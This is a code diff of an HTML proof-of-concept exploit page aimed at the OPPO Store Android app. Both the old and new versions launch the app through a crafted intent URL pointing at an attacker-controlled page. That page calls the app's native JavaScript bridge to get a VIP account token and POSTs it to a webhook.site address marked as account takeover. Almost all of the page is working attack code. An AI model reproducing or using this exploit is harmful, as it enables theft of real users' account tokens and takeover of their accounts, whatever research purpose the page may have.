@@ -2,59 +2,42 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OPPO Store Security Proof</title>
-    <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f0f2f5; }
-        .btn { width: 100%; max-width: 350px; padding: 20px; margin: 15px 0; font-size: 16px; font-weight: bold; color: white; border: none; border-radius: 15px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.1); background-color: #ff6600; }
-        #log { text-align: left; background: #fff; padding: 15px; font-family: monospace; font-size: 12px; margin-top: 20px; border: 1px solid #ddd; border-radius: 8px; }
-    </style>
+    <title>OPPO Store Exploit Proof</title>
 </head>
-<body>
-
-    <h2>OPPO Store Bypass (Double Hop)</h2>
-    <p>Targeting strictly <b>com.heytap.store</b></p>
-
-    <button class="btn" onclick="doubleHop()">Execute Exploit</button>
-
-    <div id="log">Status Log:<br></div>
-
+<body style="background-color: white; color: black;">
     <script>
-        const myExploitUrl = "https://pk009900.github.io/my-oppo-test/";
+        // IMMEDIATE ALERT: If you see this inside the OPPO Store app, the exploit is WORKING.
+        alert("EXPLOIT RUNNING INSIDE OPPO STORE");
+
         const webhook = "https://webhook.site/9ed139f6-4ad2-4394-adc8-1ba1419aa0cd";
-        const pkg = "com.heytap.store";
 
-        function log(msg) {
-            document.getElementById("log").innerHTML += "> " + msg + "<br>";
-        }
-
-        function doubleHop() {
-            log("Attempting Double Hop Intent...");
-            
-            // Step 1: Attempt to open the intent in a new window to break the Play Store redirect chain
-            const intent = `intent://www.oppo.com?url=${myExploitUrl}#Intent;scheme=https;package=${pkg};S.browser_fallback_url=${myExploitUrl};end`;
-            
-            var win = window.open(intent, '_blank');
-            
-            // Step 2: Fallback logic if the new window is blocked or fails
-            setTimeout(function() {
-                if(!win || win.closed || typeof win.closed=='undefined') {
-                    log("Window blocked. Trying direct replace...");
-                    window.location.replace(intent);
-                }
-            }, 500);
+        function leak_callback(data) {
+            fetch(webhook, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({ status: "SUCCESS_ATO", data: data })
+            });
+            alert("TOKEN STOLEN: Check Webhook!");
         }
 
         window.onload = function() {
             if (window.HeytapNativeApi) {
-                log("<b style='color:green'>SUCCESS: JSAPI BRIDGE INJECTED!</b>");
-                window.HeytapNativeApi.invoke("vip.getToken", (data) => {
-                    fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
-                    log("Token exfiltrated to Webhook.");
-                    alert("PoC Successful: Token Stolen");
-                });
+                // The bridge is present, steal the token
+                window.HeytapNativeApi.invoke("vip.getToken", "leak_callback");
             }
         };
+
+        function trigger() {
+            const target = "https://pk009900.github.io/my-oppo-test/";
+            // This path (/web/index.html) is the standard entry for the internal browser
+            const intent = `intent://web/index.html?url=${target}#Intent;scheme=heytap;package=com.heytap.store;S.browser_fallback_url=${target};end`;
+            window.location.href = intent;
+        }
     </script>
+
+    <h1 style="margin-top:100px;">OPPO Store Bypass</h1>
+    <button onclick="trigger()" style="padding: 30px; font-size: 20px; background: orange; color: white;">
+        CLICK TO RE-TRIGGER APP
+    </button>
 </body>
 </html>
